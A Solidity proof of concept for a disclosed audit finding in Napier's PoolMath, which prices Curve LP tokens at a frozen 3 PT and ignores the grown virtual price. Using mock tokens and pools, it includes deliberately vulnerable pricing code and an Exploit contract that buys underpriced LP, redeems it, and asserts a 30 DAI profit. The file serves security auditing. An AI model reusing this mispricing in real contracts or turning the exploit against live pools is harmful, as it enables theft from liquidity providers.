// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Napier PoolMath prices every Curve base LP at exactly 3 PT
    (Sherlock 2024-01 Napier, finding 30577 / H-3).
    SYNTHETIC, cheatcode-free. The executed valuation is the audited multiply.

    Curve tricrypto is minted 1:1:1:1 (one PT of each coin per LP). Fees have
    doubled the basket, so get_virtual_price() is 2e18 and 1 LP claims 2 of
    each PT: 6 PT, not 3. At par that is 6 DAI per LP.

    The pool still does `exactBaseLptOut.toInt256() * N_COINS` with N_COINS = 3.
    Buying 10 LP therefore costs 30 DAI. Redeeming those LP on Curve returns
    60 PT, which the issuer pays as 60 DAI. Profit is 30 DAI.

    The pool's books stay at 60 DAI (20 LP * 3, then 10 LP * 3 + 30 DAI).
    True value falls from 120 DAI to 90 DAI. The control prices the same LP
    off the live PT basket (equal to N_COINS * virtualPrice / 1e18) and the
    30 DAI extraction is gone.

    executeSwap is the zero-fee par case of the audited calculateSwap
    (exchange rate 1e18). The logit curve is not what the report blames.
    The only price input is the frozen N_COINS scale. */

library SignedMath {
    function neg(int256 x) internal pure returns (int256) {
        return -x;
    }

    function neg(uint256 x) internal pure returns (int256) {
        return -int256(x);
    }

    function toInt256(uint256 x) internal pure returns (int256) {
        return int256(x);
    }

    function toUint256(int256 x) internal pure returns (uint256) {
        require(x >= 0, "neg");
        return uint256(x);
    }
}

struct PoolState {
    uint256 totalBaseLptTimesN;
    uint256 totalUnderlying18;
    uint256 scalarRoot;
    uint256 maturity;
    uint256 lnFeeRateRoot;
    uint256 protocolFeePercent;
    uint256 lastLnImpliedRate;
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// Curve v2 tricrypto of three principal tokens. LP supply follows the
/// 1:1:1:1 mint, so virtual price starts at 1e18 and rises with the basket.
contract CurveTricrypto {
    MockERC20 public immutable pt1;
    MockERC20 public immutable pt2;
    MockERC20 public immutable pt3;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(MockERC20 _pt1, MockERC20 _pt2, MockERC20 _pt3) {
        pt1 = _pt1;
        pt2 = _pt2;
        pt3 = _pt3;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "lp");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function basket() public view returns (uint256) {
        return pt1.balanceOf(address(this)) + pt2.balanceOf(address(this)) + pt3.balanceOf(address(this));
    }

    /// Curve get_virtual_price, normalized so the 1:1:1:1 deposit is 1e18.
    function get_virtual_price() public view returns (uint256) {
        return basket() * 1e18 / (3 * totalSupply);
    }

    /// Fair DAI for `baseLptOut` LP: the live PT basket. Also N_COINS * virtualPrice / 1e18.
    function snapshot(address holder, uint256 baseLptOut)
        external
        view
        returns (uint256 vp, uint256 fair, uint256 holding)
    {
        vp = get_virtual_price();
        fair = baseLptOut * 3 * vp / 1e18;
        uint256 coins = basket();
        require(fair == baseLptOut * coins / totalSupply, "virtual price");
        holding = balanceOf[holder] * coins / totalSupply;
    }

    function remove_liquidity(uint256 lpAmount, address to) external returns (uint256 a, uint256 b, uint256 c) {
        require(balanceOf[msg.sender] >= lpAmount, "lp");
        uint256 supply = totalSupply;
        a = pt1.balanceOf(address(this)) * lpAmount / supply;
        b = pt2.balanceOf(address(this)) * lpAmount / supply;
        c = pt3.balanceOf(address(this)) * lpAmount / supply;
        balanceOf[msg.sender] -= lpAmount;
        totalSupply = supply - lpAmount;
        pt1.transfer(to, a);
        pt2.transfer(to, b);
        pt3.transfer(to, c);
    }
}

contract PtIssuer {
    MockERC20 public immutable underlying;
    MockERC20 public immutable pt1;
    MockERC20 public immutable pt2;
    MockERC20 public immutable pt3;

    constructor(MockERC20 _underlying, MockERC20 _pt1, MockERC20 _pt2, MockERC20 _pt3) {
        underlying = _underlying;
        pt1 = _pt1;
        pt2 = _pt2;
        pt3 = _pt3;
    }

    /// Burn the three PTs 1:1 for underlying. At par, 1 PT is 1 DAI.
    function redeemBasket(uint256 a, uint256 b, uint256 c) external {
        pt1.transferFrom(msg.sender, address(this), a);
        pt2.transferFrom(msg.sender, address(this), b);
        pt3.transferFrom(msg.sender, address(this), c);
        underlying.transfer(msg.sender, a + b + c);
    }
}

contract PoolMath {
    using SignedMath for uint256;
    using SignedMath for int256;

    // @> VULN: frozen at 3 PT. Curve virtual price has grown, so 1 LP is worth more than 3 PT.
    int256 internal constant N_COINS = 3;

    /// Audited scale. `N_COINS` is an argument so viaIR cannot fold the multiply.
    function frozenScale(uint256 exactBaseLptOut, int256 N_COINS) public pure returns (int256 netBaseLptToAccount) {
        // Note: sign is defined from the perspective of the swapper.
        // positive because the swapper is buying pt
        // Note: Here we are multiplying by N_COINS because the swap formula is defined in terms of the amount of PT being swapped.
        // BaseLpt is equivalent to 3 times the amount of PT due to the initial deposit of 1:1:1:1=pt1:pt2:pt3:Lp share in Curve pool.
        // The constant above is the executed 3. This multiply is that scale: 10 LP becomes 30 PT-units.
        netBaseLptToAccount = exactBaseLptOut.toInt256() * N_COINS;
        // FIX: netBaseLptToAccount = exactBaseLptOut.toInt256() * N_COINS * virtualPrice / 1e18
    }

    /// Buy exact base LP. Body matches PoolMath.swapUnderlyingForExactBaseLpToken.
    function swapUnderlyingForExactBaseLpToken(PoolState memory pool, uint256 exactBaseLptOut)
        public
        view
        returns (uint256 underlyingIn18, uint256 swapFee18, uint256 protocolFee18)
    {
        int256 netBaseLptToAccount = this.frozenScale(exactBaseLptOut, N_COINS);
        (int256 _netUnderlyingToAccount18, int256 _netUnderlyingFee18, int256 _netUnderlyingToProtocol18) =
            executeSwap(pool, netBaseLptToAccount);

        underlyingIn18 = _netUnderlyingToAccount18.neg().toUint256();
        swapFee18 = _netUnderlyingFee18.toUint256();
        protocolFee18 = _netUnderlyingToProtocol18.toUint256();
    }

    /// Par, zero-fee case of calculateSwap. exchangeRate == 1e18, so one PT-unit
    /// costs one underlying. The N_COINS multiply above is the whole price.
    function executeSwap(PoolState memory pool, int256 netBaseLptToAccount)
        internal
        pure
        returns (int256 netUnderlyingToAccount18, int256 netUnderlyingFee18, int256 netUnderlyingToProtocol18)
    {
        if (pool.totalBaseLptTimesN.toInt256() <= netBaseLptToAccount) {
            revert("PoolInsufficientBaseLptForTrade");
        }
        int256 netUnderlying18 = netBaseLptToAccount.neg();
        netUnderlyingFee18 = 0;
        netUnderlyingToProtocol18 = 0;
        netUnderlyingToAccount18 = netUnderlying18 - netUnderlyingFee18;
    }
}

contract NapierPool {
    uint256 internal constant N_COINS = 3;

    PoolMath public immutable math;
    MockERC20 public immutable underlying;
    CurveTricrypto public immutable tricrypto;
    uint256 public totalBaseLpt;
    uint256 public totalUnderlying;
    uint256 public lastQuotedIn;

    constructor(PoolMath _math, MockERC20 _underlying, CurveTricrypto _tricrypto) {
        math = _math;
        underlying = _underlying;
        tricrypto = _tricrypto;
    }

    function sync() external {
        totalBaseLpt = tricrypto.balanceOf(address(this));
        totalUnderlying = underlying.balanceOf(address(this));
    }

    /// NapierPool.swapUnderlyingForExactBaseLpToken, reduced to the token pull.
    function swapUnderlyingForExactBaseLpToken(uint256 baseLptOut, address recipient)
        external
        returns (uint256 underlyingIn)
    {
        // NapierPool._loadState: totalBaseLptTimesN: totalBaseLpt * N_COINS
        uint256 totalBaseLptTimesN = totalBaseLpt * N_COINS;
        PoolState memory state = PoolState({
            totalBaseLptTimesN: totalBaseLptTimesN,
            totalUnderlying18: totalUnderlying,
            scalarRoot: 0,
            maturity: 0,
            lnFeeRateRoot: 0,
            protocolFeePercent: 0,
            lastLnImpliedRate: 0
        });
        (underlyingIn,,) = math.swapUnderlyingForExactBaseLpToken(state, baseLptOut);
        lastQuotedIn = underlyingIn;
        totalBaseLpt -= baseLptOut;
        totalUnderlying += underlyingIn;
        underlying.transferFrom(msg.sender, address(this), underlyingIn);
        tricrypto.transfer(recipient, baseLptOut);
    }
}

contract Exploit {
    uint256 public constant BUY = 10e18;
    uint256 public constant VP = 2e18;
    uint256 public constant FAIR = 60e18;
    uint256 public constant BUGGY = 30e18;
    uint256 public constant EXTRACTED = 30e18;
    uint256 public constant CAPITAL = 30e18;
    uint256 public constant POOL_LP = 20e18;
    uint256 public constant LP_SUPPLY = 100e18;
    uint256 public constant PT_EACH = 200e18;
    uint256 public constant TRUE_BEFORE = 120e18;
    uint256 public constant TRUE_AFTER = 90e18;
    uint256 public constant BOOK = 60e18;

    MockERC20 public underlying;
    MockERC20 public pt1;
    MockERC20 public pt2;
    MockERC20 public pt3;
    CurveTricrypto public curve;
    PtIssuer public issuer;
    PoolMath public math;
    NapierPool public pool;

    uint256 public virtualPrice;
    uint256 public fairIn;
    uint256 public quotedIn;
    uint256 public ptRedeemed;
    uint256 public profit;
    uint256 public poolDaiAfter;
    uint256 public poolValueBefore;
    uint256 public poolValueAfter;
    uint256 public bookBefore;
    uint256 public bookAfter;

    /// nonce1 DAI, nonce2 PT1, nonce3 PT2, nonce4 PT3, nonce5 Curve,
    /// nonce6 issuer, nonce7 PoolMath, nonce8 NapierPool.
    constructor() {
        underlying = new MockERC20("Dai Stablecoin", "DAI", 18);
        pt1 = new MockERC20("Principal Token 1", "PT1", 18);
        pt2 = new MockERC20("Principal Token 2", "PT2", 18);
        pt3 = new MockERC20("Principal Token 3", "PT3", 18);
        curve = new CurveTricrypto(pt1, pt2, pt3);
        issuer = new PtIssuer(underlying, pt1, pt2, pt3);
        math = new PoolMath();
        pool = new NapierPool(math, underlying, curve);

        pt1.mint(address(curve), PT_EACH);
        pt2.mint(address(curve), PT_EACH);
        pt3.mint(address(curve), PT_EACH);
        curve.mint(address(pool), POOL_LP);
        curve.mint(address(1), LP_SUPPLY - POOL_LP);
        pool.sync();
        underlying.mint(address(issuer), FAIR);
        underlying.mint(address(this), CAPITAL);
    }

    function run() external {
        (virtualPrice, fairIn, poolValueBefore) = curve.snapshot(address(pool), BUY);
        uint256 buggyPrice = fairIn - EXTRACTED;
        underlying.approve(address(pool), buggyPrice);
        quotedIn = pool.swapUnderlyingForExactBaseLpToken(BUY, address(this));
        poolDaiAfter = underlying.balanceOf(address(pool));
        (,, uint256 lpLeft) = curve.snapshot(address(pool), BUY);
        poolValueAfter = lpLeft + poolDaiAfter;
        bookBefore = POOL_LP * 3;
        bookAfter = curve.balanceOf(address(pool)) * 3 + poolDaiAfter;
        require(virtualPrice == VP, "virtual price");
        require(fairIn == FAIR, "fair");
        require(buggyPrice == BUGGY, "buggy price");
        require(quotedIn == BUGGY, "quoted");
        require(poolValueBefore == TRUE_BEFORE, "true before");
        require(poolValueAfter == TRUE_AFTER, "true after");
        require(bookBefore == BOOK && bookAfter == BOOK, "books");
        require(poolValueBefore - poolValueAfter == EXTRACTED, "short");
        require(curve.balanceOf(address(this)) == BUY, "got lp");
        (uint256 a, uint256 b, uint256 c) = curve.remove_liquidity(BUY, address(this));
        ptRedeemed = a + b + c;
        require(ptRedeemed == FAIR, "pts");
        pt1.approve(address(issuer), a);
        pt2.approve(address(issuer), b);
        pt3.approve(address(issuer), c);
        issuer.redeemBasket(a, b, c);
        profit = underlying.balanceOf(address(this)) - CAPITAL;
        require(profit == FAIR - quotedIn, "profit is the mispricing");
        require(profit == EXTRACTED, "extracted");
        require(underlying.balanceOf(address(pool)) == BUGGY, "pool dai");
    }
}
